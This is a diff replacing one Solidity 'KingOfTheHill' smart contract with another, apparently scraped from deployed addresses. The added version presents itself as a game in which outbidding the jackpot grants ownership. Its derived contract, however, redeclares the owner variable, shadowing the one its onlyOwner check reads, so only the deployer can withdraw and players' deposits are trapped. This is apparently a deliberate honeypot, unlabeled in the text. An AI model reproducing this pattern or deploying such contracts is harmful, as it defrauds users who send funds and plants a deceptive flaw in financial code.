@@ -1,52 +1,39 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract KingOfTheHill at 0x14e2ac9b6ca7bade21afdfa31b63708fc0b08d8f
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract KingOfTheHill at 0x4dc76cfc65b14b3fd83c8bc8b895482f3cbc150a
 */
-/**
- *	Made by X-cessive Overlord of Acmeme.biz.
- *	Gamble responsibly.
- */
+pragma solidity ^0.4.11;
 
-pragma solidity ^0.4.18;
+// Simple Game. Each time you send more than the current jackpot, you become
+// owner of the contract. As an owner, you can take the jackpot after a delay
+// of 5 days after the last payment.
 
-contract KingOfTheHill {
+contract Owned {
+    address owner;    function Owned() {
+        owner = msg.sender;
+    }
+    modifier onlyOwner{
+        if (msg.sender != owner)
+            revert();        _;
+    }
+}
 
-	uint public timeLimit = 1 hours;
-	uint public lastKing;
-	address public owner;
-	address public currentKing;
-	address[] public previousEntries;
+contract KingOfTheHill is Owned {
+    address public owner;
+    uint public jackpot;
+    uint public withdrawDelay;
 
-	event NewKing(address indexed newKing, uint timestamp);
-	event Winner(address indexed winner, uint winnings);
-	
-	function KingOfTheHill() public {
-		owner = msg.sender;
-	}
+    function() public payable {
+        // transfer contract ownership if player pay more than current jackpot
+        if (msg.value > jackpot) {
+            owner = msg.sender;
+            withdrawDelay = block.timestamp + 5 days;
+        }
+        jackpot+=msg.value;
+    }
 
-	function seed() external payable {
-		require(msg.sender == owner);
-		lastKing = block.timestamp;
-	}
-
-	function () external payable {
-		require(msg.value == 0.1 ether);
-		if ((lastKing + timeLimit) < block.timestamp) {
-			winner();
-		}
-		previousEntries.push(currentKing);
-		lastKing = block.timestamp;
-		currentKing = msg.sender;
-		NewKing(currentKing, lastKing);
-	}
-
-	function winner() internal {
-		uint winnings = this.balance - 0.1 ether;
-		currentKing.transfer(winnings);
-		Winner(currentKing, winnings);
-	}
-
-	function numberOfPreviousEntries() constant external returns (uint) {
-		return previousEntries.length;
-	}
-
+    function takeAll() public onlyOwner {
+        require(block.timestamp >= withdrawDelay);
+        msg.sender.transfer(this.balance);
+        jackpot=0;
+    }
 }
